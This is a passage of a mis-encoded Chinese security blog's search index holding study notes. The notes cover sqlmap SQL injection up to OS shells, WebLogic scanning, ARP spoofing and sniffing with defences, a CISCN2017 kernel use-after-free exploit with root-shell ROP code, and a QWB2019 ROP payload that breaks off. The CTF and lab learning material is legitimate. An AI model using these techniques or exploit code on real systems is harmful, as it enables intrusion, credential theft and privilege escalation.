å­—å…¸ï¼Œç«¯å£ï¼Œçˆ†ç ´çº¿ç¨‹æ•°é‡ç­‰ä¿¡æ¯ï¼Œç„¶åç›´æ¥runå³å¯ã€‚\n\nset RHOST/USERNAME/PASS_FILE/RPORT/THREADSç­‰ç­‰\n\n \n\n3.Burp(burpsuite)çˆ†ç ´åå°å¯†ç ï¼š(è¿˜æ²¡å­¦)\n\n \n\n \n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"4.SQLæ³¨å…¥","url":"/2021/08/19/4.SQLæ³¨å…¥/","content":"\nä¸€ã€SQLæ³¨å…¥ï¼š\n\n1.å¸¸ç”¨å‘½ä»¤ï¼š\n\n \n\n2.SQLMAPä½¿ç”¨ï¼š\n\n(1)å‰ç½®äº†è§£ï¼š\n\nå®˜æ–¹ç½‘å€ï¼šhttp://sqlmap.org\n\nGithubç½‘å€ï¼šhttps://github.com/sqlmapproject/sqlmap\n\nhttps://github.com/sqlmapproject/sqlmap/blob/master/doc/translations/README-zh-CN.md\n\nä½¿ç”¨æ‰‹å†Œï¼šhttps://github.com/sqlmapproject/sqlmap/wiki/Usage\n\n(2)å¸¸ç”¨ç±»å‹ï¼š\n\nâ–²åŸºäºå¸ƒå°”çš„ç›²æ³¨ï¼šGETå‹\n\næ”»å‡»æµç¨‹ï¼š\n\nâ‘ æµ‹è¯•ç›®æ ‡æ˜¯å¦å­˜åœ¨sqlæ³¨å…¥ï¼šsqlmap -u ip\n\nè¿™é‡Œå°±å¯èƒ½ä¼šè¿”å›payloadï¼Œå¯ä»¥ç”¨æ¥è‡ªå®šä¹‰ä½¿ç”¨\n\nâ‘¡ä¹‹åæŸ¥æ‰¾æ‰€æœ‰databaseï¼šsqlmap -u ip --dbs\n\nâ‘¢æŸ¥æ‰¾æ‰€æœ‰tablesï¼šsqlmap -u ip --tables\n\nâ‘£æŸ¥æ‰¾å­˜å‚¨çš„å±æ€§å­—æ®µï¼šsqlmap -u ip -D database_name -T table_name --columns\n\nâ‘¤ä¾æ®å±æ€§å­—æ®µæŸ¥æ‰¾æƒ³è¦çš„æ•°æ®ï¼šsqlmap -u ip -D database_name -T table_name -C column_1,column_2... --dump\n\n(ä¾‹å¦‚tableä¸­å¯èƒ½å°±ä¿å­˜id,username,passwordçš„å±æ€§ï¼Œå°±å¯ä»¥æŸ¥æ‰¾è´¦å·å¯†ç å‡ºæ¥)\n\n \n\nâ–²é’ˆå¯¹ç™»å½•æ¡†çš„SQLæ³¨å…¥ï¼šPOSTå‹\n\nâ‘ åˆ©ç”¨burpsuiteæŠ“è¯·æ±‚ç™»å½•çš„åŒ…ï¼ŒæŸ¥çœ‹(éœ€è¦å…ˆè®¾ç½®ä»£ç†ï¼Œç„¶åæ‹¦æˆªï¼Œ8080å¯èƒ½ä¸è¡Œï¼Œå¾—å…¶å®ƒç«¯å£ä»£ç†)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191504869.png)\n\nusername=admin&password=admin&authorization=\n\næœ€ä¸‹é¢çš„è¿™ä¸ªåŸºæœ¬å°±æ˜¯æˆ‘ä»¬ä¼ è¾“çš„è¯·æ±‚ç™»å½•ä¿¡æ¯ã€‚\n\nâ‘¡ç„¶åå°†è¿™äº›å†…å®¹ä¿å­˜ä¸‹æ¥ï¼Œç”Ÿæˆä¸€ä¸ªæ–‡ä»¶sql.txtï¼Œå°†è¿™ä¸ªæ–‡ä»¶ç”¨sqlmapè¿è¡Œåˆ†æï¼š\n\nsqlmap -r sql.txt\n\nè¿™æ ·å°±å¼€å§‹ä»sql.txtæ–‡ä»¶ä¸­åˆ†æäº†ï¼Œåˆ¤æ–­åˆ°åº•æœ‰æ²¡æœ‰sqlæ³¨å…¥æ¼æ´ï¼Œæœ‰çš„è¯å°±åº”è¯¥æœ‰å¯¹åº”çš„payloadç”Ÿæˆå‡ºæ¥ã€‚\n\nâ–²ä¹‹åå°±ç±»ä¼¼ä¸Šé¢çš„ï¼Œè·å–æ•°æ®åº“ï¼Œtableç­‰ç­‰ä¿¡æ¯ï¼Œä»è€Œæœ€ç»ˆè·å–æœåŠ¡å™¨çš„ç™»å½•è´¦å·å’Œå¯†ç ã€‚\n\n \n\nâ–²å…¶å®ƒç±»å‹çš„æµ‹è¯•ï¼šæµ‹è¯•å…±5çº§\n\næµ‹è¯•æ³¨å…¥æ—¶åŠ ä¸Šå‚æ•°--level=LEVEL\n\nâ‘ é»˜è®¤ï¼šGETå’ŒPOSTæµ‹è¯•\n\nâ‘¡2çº§ï¼šæµ‹è¯•cookieï¼š\n\n(çœ‹æœåŠ¡å™¨ä¼šä¸ä¼šæ ¹æ®cookieæ¥è·å–ç”¨æˆ·æ•°æ®)\n\nsqlmap -r sql.txt --level=2\n\nâ‘¡3çº§ï¼šæµ‹è¯•HTTP User-Agent/Refererå¤´çš„å€¼\n\n \n\n3.SQL-Shellï¼š\n\n(1)é€šè¿‡æ¼æ´è¿›å…¥SQL-Shellï¼š\n\nsqlmap -r sql.txt --level=5 --sql-shell\n\nè¿™æ ·å¦‚æœèƒ½è¿›å…¥å°±å¯ä»¥ç›´æ¥ç”¨SQLè¯­å¥æ¥æŸ¥è¯¢æ•°æ®\n\n(2)é€šè¿‡æ¼æ´è¿›å…¥OS-shellï¼š\n\nsqlmap -r sql.txt --level=5 --os-shell\n\nâ‘ ä¹‹åéœ€è¦é€‰æ‹©Webç«™ç‚¹çš„æ­å»ºè¯­è¨€ï¼Œé€šè¿‡æ’ä»¶æˆ–è€…å…¶å®ƒå½¢å¼åˆ¤æ–­(php,jspç­‰ç­‰)\n\nâ‘¡ç„¶åéœ€è¦è¾“å…¥ä¸€ä¸ªå¯ä»¥å¾€é‡Œé¢å†™ä¸œè¥¿çš„æ–‡ä»¶ç›®å½•ï¼šä¾‹å¦‚/var/www/upload\n\nè¿™é‡Œç›®å½•å¯ä»¥é€šè¿‡å·¥å…·æ¥æŸ¥æ‰¾ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ngit clone https://github.com/maurosoria/dirsearch\ncd dirsearch\npython3 dirsearch.py -u ip\n```\n\n \n\nè¿™æ ·sqlmapå°±å¯ä»¥ä¸Šä¼ ä¸œè¥¿ï¼Œå†™å…¥ä¸€äº›ç±»ä¼¼äºweb-shellç­‰ä¸œè¥¿ï¼Œä»è€Œè·å–æƒé™ã€‚\n\nâ‘¢é‚£ä¹ˆå°±è¿›å…¥os-shelläº†ï¼Œå¯ä»¥è·å–åˆ°æœåŠ¡å™¨æƒé™\n","tags":["WEB"],"categories":["WEB"]},{"title":"5.åˆ©ç”¨Cobaltstrikeè·å–æƒé™","url":"/2021/08/19/5.åˆ©ç”¨Cobaltstrikeè·å–æƒé™/","content":"\nä¸€ã€æ”»å‡»weblogic(ç«¯å£åŸºäº7001)ï¼š\n\nâ–²å‰ç½®ç¯å¢ƒéƒ¨ç½²ï¼š\n\n```\n#æ³¨é‡Šå¤´\n\ngit clone https://github.com/vulhub/vulhub.git\ncd  vulhub/\ncd  weblogic/\ncd CVE-......(é€‰æ‹©ä¸€ç§æ¼æ´)\ndocker-compose up -d\n```\n\nè¿™æ ·å°±æ­å»ºäº†å¥½äº†è¯¥æ¼æ´çš„ç¯å¢ƒï¼Œä½¿ç”¨docker ps -aå¯ä»¥çœ‹åˆ°ç«¯å£æ˜ å°„åˆ°æœ¬åœ°ï¼Œæ‰€ä»¥åœ¨æœ¬åœ°è¾“å…¥127.0.0.1:7001å³å¯çœ‹åˆ°å¯¹åº”çš„weblogicæœåŠ¡ã€‚\n\nè¾“å…¥127.0.0.1:7001/consoleå¯ä»¥è¿›å…¥åˆ°æœåŠ¡ç•Œé¢\n\n \n\n1.åˆ©ç”¨WeblogicScanå…ˆæ‰«æçœ‹çœ‹æœ‰æ²¡æœ‰weblogicçš„æ¼æ´:\n\n```\n#æ³¨é‡Šå¤´\n\ngit clone https://github.com/dr0op/WeblogicScan.git\ncd WeblogicScan\npip3 install -r requirements.txt\npython3 WeblogicScan.py ip 7001\n```\n\n2.æœ‰cveæ¼æ´åä¸Šç½‘æœç´¢å¯¹åº”çš„åˆ©ç”¨pocæ¥æ‰“æ”»å‡»\n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"arpæ¬ºéª—","url":"/2021/08/19/6.ARPæ¬ºéª—/","content":"\n1.é¦–å…ˆæŸ¥çœ‹å’Œè‡ªå·±åŒå±ä¸€ä¸ªç½‘æ®µä¸‹çš„ipï¼š\n\nnbtscan -r 192.168.80.167/24\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503723.png)\n\nè¿™é‡Œ157å³ä¸ºç›®æ ‡ipï¼Œ167å³ä¸ºæœ¬æœºæ”»å‡»ip\n\n(è¿™ä¸ªéœ€è¦apt-get install nbtscan)\n\n2.ç„¶åä½¿ç”¨å·¥å…·arpspoofè¿›è¡Œæ¬ºéª—ï¼Œkalilinuxè‡ªå¸¦ï¼š\n\n(1)arpspoof -i eth0 -t 192.168.80.157 192.168.80.2\n\n(eth0æ˜¯ç½‘å¡æ¥å£ï¼Œ-tåæ˜¯ç›®æ ‡ipï¼Œä¹‹åçš„ipæ˜¯è¯¥ç½‘æ®µä¸‹çš„é»˜è®¤è·¯ç”±ipï¼Œå¯ä»¥é€šè¿‡route -næŸ¥è¯¢ï¼Œæˆ–è€…å…¶å®ƒæ–¹å¼)\n\nâ–²è¿™ä¸ªåŸç†å°±æ˜¯ä¿®æ”¹å·±æ–¹çš„Macåœ°å€ä¸ºé»˜è®¤è·¯ç”±çš„Macåœ°å€ï¼Œé‚£ä¹ˆç›®æ ‡ä¸»æœºå‘å‡ºçš„MACå¸§å°±ä¼šè¢«å·±æ–¹æ¥æ”¶ã€‚\n\n(2)å¦‚æœæ”»å‡»æœºå¼€å¯äº†Ipv4çš„è·¯ç”±è½¬å‘åŠŸèƒ½ï¼Œé‚£ä¹ˆarpæ¬ºéª—ä¸ä¼šæˆåŠŸï¼Œå› ä¸ºåˆ°è¾¾æ”»å‡»æœºçš„åŒ…è¢«è½¬å‘å‡ºå»äº†ã€‚\n\nâ‘ æŸ¥çœ‹å·±æ–¹çš„è·¯ç”±è½¬å‘åŠŸèƒ½æ˜¯å¦å¼€å¯ï¼š\n\ncat /proc/sys/net/ipv4/ip_forward\n\nä¸º0åˆ™å…³é—­ï¼Œä¸º1åˆ™å¼€å¯äº†ã€‚\n\nâ‘¡ä¿®æ”¹è·¯ç”±è½¬å‘åŠŸèƒ½ï¼š\n\necho \"0\" > /proc/sys/net/ipv4/ip_forward\n\nè¿™è¡Œå‘½ä»¤æ˜¯å¾€è¯¥æ–‡ä»¶ä¸­å†™å…¥0ï¼Œå…³é—­è·¯ç”±è½¬å‘åŠŸèƒ½\n\nsysctl -p(è®©æœåŠ¡å³å¯ç”Ÿæ•ˆ)\n\nâ–²å¦å¤–æ°¸ä¹…å¼€å¯æœåŠ¡çš„ç›¸å…³å‘½ä»¤å¯ä»¥ä¸Šç½‘å†æŸ¥\n\n3.æŸ¥çœ‹è‡ªå·±æ˜¯å¦è¢«ARPæ¬ºéª—æ”»å‡»ï¼šarp -a\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503844.png)\n\nå¯ä»¥çœ‹åˆ°åœ¨ç›®æ ‡æœºå™¨ä¸Šåœ¨æ²¡æœ‰è¢«æ”»å‡»ä¹‹å‰ï¼Œé»˜è®¤è·¯ç”±ipå¯¹åº”çš„macåœ°å€å’Œæ”»å‡»æœºipå¯¹åº”çš„macåœ°å€æ˜¯ä¸ä¸€æ ·çš„ï¼Œä½†æ˜¯è¢«æ”»å‡»ä¹‹åå´å˜æˆä¸€æ ·çš„äº†ã€‚\n\nâ–²è§£å†³åŠæ³•ï¼š\n\n(1)å°†dnsæœåŠ¡å™¨ipå’Œmacé™æ€ç»‘å®š:\n\narp -s [dns_ip] [dns_mac]\n\n(2)å¦‚æœä¸çŸ¥é“åŸæ¥çš„dnsæœåŠ¡å™¨çš„macåœ°å€ï¼Œé‚£ä¹ˆå¯ä»¥å…ˆarp -dæ¸…ç©ºä¸€ä¸‹arpç¼“å­˜ï¼Œç„¶åarp -aæŸ¥çœ‹ï¼Œè¿™æ—¶å€™åŸæœ¬çš„dnsæœåŠ¡å™¨å°±ä¼šå‘è¿‡æ¥åŒ…ï¼Œå…¶MACå°±èƒ½è¢«çœ‹åˆ°ã€‚\n\n(3)å¦‚æœæ”»å‡»è€…ä¸€ç›´æ‰§è¡Œæ¬ºéª—ç¨‹åºï¼Œå¼€å¯ç³»ç»Ÿé˜²ç«å¢™åæ¸…ç©ºarpç¼“å­˜ï¼Œä¹Ÿèƒ½æŠµå¾¡ä¸€èˆ¬çš„arpæ¬ºéª—ã€‚\n\n(4)å¦‚æœé˜²ç«å¢™è¿˜æ˜¯æŠµå¾¡ä¸äº†ï¼Œæˆ–è€…ä¸å…è®¸å¼€å¯é˜²ç«å¢™ï¼Œé‚£ä¹ˆå°±è¿›è¡ŒæŠ“åŒ…ï¼Œå…ˆå°†arpç¼“å­˜æ¸…ç©ºï¼Œä¹‹åæŠ“å–dnsæœåŠ¡å™¨å‘è¿‡æ¥çš„åŒ…ï¼Œå…¶MACä¸€å®šæ­£ç¡®ï¼Œå°†è¯¥MACåœ°å€ä¸dnsæœåŠ¡å™¨ipç»‘å®šã€‚(æ²¡æœ‰æŠ“åŒ…å·¥å…·å°±é‡å¤æ¸…ç©ºç¼“å­˜ï¼ŒæŸ¥è¯¢ï¼Œå¤§ä¸äº†æ•´ä¸ªbatæ‰¹å¤„ç†ï¼Œä¸€å®šä¼šæœ‰æ”»å‡»è€…æ”»å‡»é—´éš™ä½¿å¾—dnsæœåŠ¡å™¨å‘è¿‡æ¥çš„åŒ…è¢«è§£æï¼Œç„¶åå†ç»‘å®š)\n\n![img](https://pig-007.oss-cn-beijing.aliyuncs.com/typoraImgs202108191503433.png)\n\n(5)å¦‚æœæ”»å‡»è€…å……å½“ä¸­é—´äººï¼Œæˆªå–dnså‘ç»™å—å®³è€…çš„æœåŠ¡åŒ…...é‚£å†è¯´ï¼Œä¼°è®¡åªèƒ½ç ´å¯†äº†ã€‚\n\nâ–²å¯ä»¥äº‹å…ˆå°†DNSçš„MACå®šæœŸå¤‡ä»½ï¼Œå®šæœŸåˆ é™¤ã€‚\n\n4.å¼€å¯ç›®æ ‡æœºç½‘ç»œåŠŸèƒ½ï¼Œæˆªå–ç›®æ ‡æœºçš„æ•°æ®åŒ…ï¼š\n\nâ–²ä½¿ç”¨çš„å·¥å…·åœ¨ä¸åŒåè®®å’Œä¸åŒç¯å¢ƒçš„æŠ“å–èƒ½åŠ›éƒ½ä¸å¤ªä¸€æ ·\n\n(1)ä½¿ç”¨DSniffï¼Œæ”¯æŒTelnet ã€Ftpã€Smtpã€P0P3ã€HTTPï¼Œä»¥åŠå…¶å®ƒçš„ä¸€äº›é«˜å±‚ç½‘ç»œåº”ç”¨åè®®ï¼Œç”¨Telnetæ¯”è¾ƒå¥½ç”¨ã€‚æ¯”è¾ƒè€äº†ï¼Œå¾ˆå¤šæ€æ¯’è½¯ä»¶æˆ–è€…é˜²ç«å¢™å®‰å…¨æªæ–½ä»€ä¹ˆçš„éƒ½å¯ä»¥å‘ç°ã€‚\n\ndsniff -i eth0(æœ‰æ—¶å€™ä¸å¤ªå¥½ç”¨)\n\n(2)ä½¿ç”¨Ettercap\nettercap -Tq -i eth0(Tqæ˜¯å‚æ•°ç”¨çš„ï¼Œè¿‡æ»¤æ‰ä¸å¿…è¦çš„åŒ…)\n\n \n\n \n\n \n","tags":["WEB"],"categories":["WEB"]},{"title":"CISCN2017-babydriver","url":"/2021/08/19/CISCN2017-babydriver/","content":"\n1.å¸¸è§„è§£åŒ…åˆ†æ:\n\n```\n//æ³¨é‡Šå¤´\n\nmkdir rootfs\ncd rootfs\nmv ../rootfs.cpio rootfs.cpio.gz //æ”¹åï¼Œæ–¹ä¾¿gunzipè¯†åˆ«æ ¼å¼\ngunzip ./rootfs.cpio.gz //è§£å‹\ncpio -idm < ./rootfs.cpio //å†æ¬¡è§£å‹\n```\n\n2.æŸ¥çœ‹init\n\n```\n#æ³¨é‡Šå¤´\n\n#!/bin/sh\n\nmount -t proc none /proc\nmount -t sysfs none /sys\nmount -t devtmpfs devtmpfs /dev\nchown root:root flag\nchmod 400 flag\nexec 0</dev/console\nexec 1>/dev/console\nexec 2>/dev/console\n\ninsmod /lib/modules/4.4.72/babydriver.ko\nchmod 777 /dev/babydev\necho -e \"\\nBoot took $(cut -d' ' -f1 /proc/uptime) seconds\\n\"\nsetsid cttyhack setuidgid 1000 sh\n\numount /proc\numount /sys\npoweroff -d 0 -f\n```\n\nå¯ä»¥çœ‹åˆ°åŠ è½½äº†/lib/modules/4.4.72/babydriver.koæ¨¡å—ï¼Œæƒé™ä¸º1000å³æ™®é€šæƒé™ï¼Œä½†æ˜¯flagåœ¨root/ä¸‹ï¼Œéœ€è¦rootæƒé™ï¼Œé‚£ä¹ˆéœ€è¦ææƒã€‚\n\n3.æŸ¥çœ‹å¯åŠ¨qemuå‘½ä»¤ï¼š\n\n```\n#!/bin/bash\n\nqemu-system-x86_64\\ \n-initrd rootfs.cpio\\\n-kernel bzImage \\\n-append 'console=ttyS0 root=/dev/ram oops=panic panic=1'\\\n-enable-kvm \\\n-monitor /dev/null \\\n-m 64M \\\n--nographic\\\n-smp cores=1,threads=1 \\\n-cpu kvm64,+smep\\\n```\n\nå¾ˆå¸¸è§„ï¼Œå”¯ä¸€éœ€è¦æ³¨æ„çš„æ˜¯å¼€å¯äº†smepä¿æŠ¤\n\n4.IDAæ‰“å¼€åˆ†æåŠ è½½çš„babydriver.koæ¨¡å—ï¼Œä¸€èˆ¬æ¼æ´å°±åœ¨è¿™é‡Œï¼Œè¿™é‡Œå°±æ˜¯UAFæ¼æ´ï¼Œæ¼æ´ç‚¹åœ¨å…¨å±€å˜é‡çš„è®¾ç½®ï¼š\n\nâ–²ç”¨åˆ°çš„çŸ¥è¯†ç‚¹ï¼šè¿™é‡Œç”±äºæ˜¯linuxå†…æ ¸ï¼Œé‚£ä¹ˆå½“Linuxå†…æ ¸æ¨¡å—é“¾æ¥åˆ°å†…æ ¸ä¸­ï¼Œå¦‚æœåœ¨Koæ¨¡å—çš„æºä»£ç ä¸­å®ƒä»¬å…·æœ‰å…¨å±€å˜é‡ï¼Œåˆ™æ¯ä¸ªå…¨å±€å˜é‡åªæœ‰ä¸€ä¸ªå‰¯æœ¬ï¼Œæ¯ä¸ªkoæ¨¡å—çš„è®¾å¤‡ç¨‹åºå…±äº«è¿™ä¸ªå…¨å±€å˜é‡\n\n(1)ç”±äºbabydev_structæ˜¯ä¸ªå…¨å±€å˜é‡ï¼Œæ‰€ä»¥æ‰“å¼€ä¸¤ä¸ªbabydriver.koè®¾å¤‡ä¹‹åï¼Œç¬¬ä¸€ä¸ªè®¾å¤‡ç¨‹åºfd1ä½¿ç”¨command == 0x10001è°ƒç”¨babyioctlå‡½æ•°ï¼Œç”³è¯·å †å—åï¼Œå¦‚æœç¬¬äºŒä¸ªè®¾å¤‡ç¨‹åºfd2å†è°ƒç”¨babyioctlå‡½æ•°ç”³è¯·å †å—ï¼Œåˆ™ä¼šè¦†ç›–æ‰babydev_struct.device_bufã€‚\n\n(2)é‚£ä¹ˆå¦‚æœå°†ç¬¬ä¸€ä¸ªè®¾å¤‡é‡Šæ”¾æ‰ï¼Œåˆ™babydev_struct.device_bufæŒ‡å‘çš„å†…å­˜ä¼šè¢«æ ‡è®°ä¸ºé‡Šæ”¾çŠ¶æ€ï¼Œä½†æ˜¯ä»ç„¶å¯ä»¥é€šè¿‡fd2æ¥ä¿®æ”¹è¿™å—å†…å­˜ï¼Œé€ æˆUAFã€‚\n\n(3)æœ€å¼€å§‹é€šè¿‡è°ƒç”¨babyioctlå‡½æ•°å°†è¿™å—å†…å­˜å¤§å°ä¿®æ”¹ä¸ºsizeçš„å †å—ï¼Œä¹‹åå¦‚æœå†ç”³è¯·sizeå¤§å°çš„å†…å­˜ï¼Œå°±ä¼šå…ˆå°†è¿™å—å†…å­˜ç”³è¯·å›æ¥ï¼Œç„¶åæˆ‘ä»¬è¿˜æ˜¯å¯ä»¥é€šè¿‡UAFä½¿ç”¨fd2æ¥ä¿®æ”¹è¿™å—æœ¬ä¸åº”è¯¥èƒ½ä¿®æ”¹çš„å†…å­˜ã€‚\n\n(4)è¿™æ—¶å°±è€ƒè™‘å°†è¿™å—å†…å­˜ç”³è¯·æˆä»€ä¹ˆæ ·çš„å†…å­˜æ¥åˆ©ç”¨ï¼Œè¿™é‡Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ã€‚\n\nâ–²æ–¹æ³•ä¸€ï¼šåˆ©ç”¨credç»“æ„ä½“\n\nåœ¨kernelä¸­ï¼Œæ¯ä¸€ä¸ªè¿›ç¨‹éƒ½ä¼šåˆ›å»ºä¸€ä¸ªcredç»“æ„ä½“ï¼Œç”¨æ¥å­˜å‚¨è¿›ç¨‹çš„æƒé™ç­‰ä¿¡æ¯\n\nâ‘ ä¿®æ”¹sizeå¤§å°ä¸ºcredç»“æ„ä½“å¤§å°ï¼Œå†åˆ©ç”¨forkåˆ›å»ºå­è¿›ç¨‹ï¼Œè¿‡ç¨‹ä¸­ä¼šåˆ›å»ºçš„credç»“æ„ä½“ï¼Œé‚£ä¹ˆå°±å¯ä»¥å°†è¿™å—å†…å­˜å˜æˆå­è¿›ç¨‹çš„credç»“æ„ä½“ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\n// æ‰“å¼€ä¸¤æ¬¡è®¾å¤‡ï¼Œè§¦å‘ä¼ªæ¡ä»¶ç«äº‰\nint fd1 = open(\"/dev/babydev\", 2);\nint fd2 = open(\"/dev/babydev\", 2);\n\n// ä¿®æ”¹ babydev_struct.device_buf_len ä¸º sizeof(struct cred)\nioctl(fd1, 0x10001, 0xa8);\n\n// é‡Šæ”¾fd1\nclose(fd1);\n\n// æ–°èµ·è¿›ç¨‹çš„ cred ç©ºé—´ä¼šå’Œåˆšåˆšé‡Šæ”¾çš„ babydev_struct é‡å \nint pid = fork();\n```\n\nâ‘¡ä¹‹åä¿®æ”¹å­è¿›ç¨‹credä¸­çš„uidï¼Œgidä¸º0ï¼Œä½¿å…¶ä¸ºrootæƒé™ï¼Œå³å¯å°†å­è¿›ç¨‹ææƒã€‚ææƒä¹‹åå³å¯è°ƒç”¨system(\"/bin/sh\")è·å¾—rootæƒé™çš„shellã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nif(pid < 0)\n{\n    puts(\"[*] fork error!\");\n    exit(0);\n}\n\nelse if(pid == 0)\n{\n    // é€šè¿‡æ›´æ”¹ fd2ï¼Œä¿®æ”¹æ–°è¿›ç¨‹çš„ cred çš„ uidï¼Œgid ç­‰å€¼ä¸º0\n    char zeros[30] = {0};\n    write(fd2, zeros, 28);\n\n    if(getuid() == 0)\n    {\n        puts(\"[+] root now.\");\n        system(\"/bin/sh\");\n        exit(0);\n    }\n}\n\nelse\n{\n    wait(NULL);\n}\nclose(fd2);\n```\n\nâ–²æ–¹æ³•äºŒï¼šæ‰“å¼€è®¾å¤‡ptmxï¼Œåˆ©ç”¨åˆ›å»ºçš„tty_structç»“æ„ä½“å’Œä¿®æ”¹å‡½æ•°æŒ‡é’ˆæ¥ROPã€‚\n\n(ä¸€èˆ¬ROPçš„è°ƒç”¨éœ€è¦å…³æ‰smepä¿æŠ¤)\n\nâ‘ ä¿®æ”¹sizeå¤§å°ä¸ºtty_structç»“æ„ä½“å¤§å°ï¼Œé‡Šæ”¾ç©ºé—´ï¼Œä¹‹åç”¨æˆ·ç©ºé—´æ‰“å¼€ptmxè®¾å¤‡ï¼Œå°±ä¼šå°†è¿™å—å†…å­˜ç”³è¯·ä¸ºtty_structç»“æ„ä½“ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nint fd1 = open(\"/dev/babydev\", O_RDWR);\nint fd2 = open(\"/dev/babydev\", O_RDWR);\nioctl(fd1, 0x10001, 0x2e0);\nclose(fd1);\nint fd_tty = open(\"/dev/ptmx\", O_RDWR|O_NOCTTY);\n```\n\nâ‘¡ä¿®æ”¹tty_structç»“æ„ä½“ä¸­çš„const struct tty_operations *ops;æŒ‡é’ˆæŒ‡å‘ç”¨æˆ·ç©ºé—´ä¼ªé€ çš„fake_tty_operationsç»“æ„ä½“ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nsize_t fake_tty_struct[4] = {0};\nread(fd2, fake_tty_struct, 32);\nfake_tty_struct[3] = (size_t)fake_tty_operations;\n```\n\nâ‘¢å°†ç”¨æˆ·ç©ºé—´çš„fake_tty_operationsä¸­çš„writeå‡½æ•°æŒ‡é’ˆæŒ‡å‘ROPé“¾ã€‚\n\n```\n//æ³¨é‡Šå¤´\n\nvoid* fake_tty_operations[30];\n--------------------------------------------------------------------\nfor(int i = 0; i < 30; i++)\n{\n    fake_tty_operations[i] = 0xFFFFFFFF8181BFC5;\n}\nfake_tty_operations[0] = 0xffffffff810635f5; //pop rax; pop rbp; ret;\nfake_tty_operations[1] = (size_t)rop;\nfake_tty_operations[3] = 0xFFFFFFFF8181BFC5; // mov rsp,rax ; dec ebx ; ret\n---------------------------------------------------------------------\nint i = 0;\nsize_t rop[32] = {0};\nrop[i++] = 0xffffffff810d238d;\t\t// pop rdi; ret;\nrop[i++] = 0x6f0;\nrop[i++] = 0xffffffff81004d80;\t\t// mov cr4, rdi; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = (size_t)get_root;\nrop[i++] = 0xffffffff81063694;\t\t// swapgs; pop rbp; ret;\nrop[i++] = 0;\nrop[i++] = 0xffffffff814e35ef;\t\t// iretq; ret;\nrop[i++] = (size_t)get_shell;\nrop[i++] = user_cs;                /* saved CS */\nrop[i++] = user_rflags;            /* saved EFLAGS */\nrop[i++] = user_sp;\nrop[i++] = user_ss;\n```\n\n \n\nâ‘£å‘ptmxè®¾å¤‡å†™å…¥å†…å®¹ï¼Œå³å¯è°ƒç”¨writeå‡½æ•°ä»è€Œè°ƒç”¨ROPé“¾ã€‚\n\nâ‘¤åˆ©ç”¨ROPé“¾å…³æ‰sempä¿æŠ¤ï¼Œä¹‹åRet2Usrå³å¯ã€‚\n\n \n\n \n\n \n","tags":["mimic"],"categories":["pwn-kernel","Kernel-ROP","Kernel-UAF"]},{"title":"QWB2019-babymimic","url":"/2021/08/19/QWB2019-babymimic/","content":"\nPWNæ‹Ÿæ€é¢˜ï¼Œéœ€è¦æˆ‘ä»¬é’ˆå¯¹ä¸¤ä¸ªç¨‹åºè¾“å…¥è¾“å‡ºå®Œå…¨ä¸€è‡´ï¼Œexpè¦åŒæ—¶èƒ½å¤Ÿæ‰“ç©¿ä¸¤ä¸ªç¨‹åºã€‚å‰æœŸçš„çˆ†ç ´ä»€ä¹ˆçš„å°±ä¸çœ‹äº†ï¼Œçœ‹[EXå¸ˆå‚…çš„åšå®¢](http://blog.eonew.cn/archives/1009)å°±å¥½äº†\n\n1.ç¨‹åºåˆ†ä¸ºstkof32å’Œstkof64ï¼Œå¤§å¤šéƒ½ç›¸åŒï¼Œåªæ˜¯ä¸€ä¸ªæ˜¯64ä¸€ä¸ªæ˜¯32ï¼Œç„¶åç¨‹åºæ˜¯æ ‡å‡†æ ˆæº¢å‡ºï¼Œåç§»ä¸åŒï¼Œ32ä½ä¸º272å­—èŠ‚ï¼Œ64ä½ä¸º280å­—èŠ‚ï¼Œç›¸å·®8ä¸ªå­—èŠ‚ã€‚è¿™é‡Œå°±ä¸ºä¸€ä¸ªexpæ”»ç ´ä¸¤ä¸ªç¨‹åºæä¾›äº†æ¼æ´ï¼Œå¦å¤–ç”±äºç¨‹åºæ²¡æœ‰å¼€PIEï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥ROPã€‚\n\n2.è¿™é‡Œå°±ç”¨ç›¸å·®çš„8ä¸ªå­—èŠ‚ï¼Œå³32ä½ç¨‹åºä¼šæ¯”64ä½çš„å¤šè¿è¡Œä¸¤ä¸ªæŒ‡ä»¤ï¼Œé‚£ä¹ˆå°±é’ˆå¯¹è¿™ä¸¤ä¸ªæŒ‡ä»¤æ¥åšæ–‡ç« ã€‚\n\n3.è¿™é‡Œå°±æ˜¯å°†64ä½ç¨‹åºçš„ROPé“¾ç›´æ¥æ”¾åœ¨retåœ°å€ä¸Šï¼Œ32ä½ç¨‹åºåˆ©ç”¨å¤šå‡ºæ¥çš„ä¸¤ä¸ªæŒ‡ä»¤ï¼Œä¸‹æ‹‰espï¼ŒæŠŠROPé“¾æ”¾åœ¨64ä½ROPé“¾çš„åé¢ï¼š\n\n(1)64ä½ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n#function(rdi,rsi,rdx)\n\n#read /bin/sh\npayload += p64(pop_rax_ret) + p64(0x0)\npayload += p64(pop_rdi_ret) + p64(0x0)\npayload += p64(pop_rsi_ret) + p64(0x0069e200)\npayload += p64(pop_rdx_ret) + p64(0x200)\npayload += p64(syscall)\n\n#execve(\"/bin/sh\",0,0)\npayload += p64(pop_rax_ret) + p64(0x3b)\npayload += p64(pop_rdi_ret) + p64(0x0069e200)\npayload += p64(pop_rsi_ret) + p64(0x0)\npayload += p64(pop_rdx_ret) + p64(0x0)\npayload += p64(syscall)\n```\n\n(2)32ä½ï¼š\n\n```python\n#æ³¨é‡Šå¤´\n\n#function(ebx,ecx,edx)\n\n#read /bin/sh \npayload += p32(pop_edx_ecx_edx_ret)\npayload += p32(0x200)+p32(0x080d7200)+p32(0x0)\npayload += p32(pop_eax_ret) + p32(0x3)\npayload += p32(int0x80)\n\n#execve(\"/bin/sh\",0,0)\npayload += 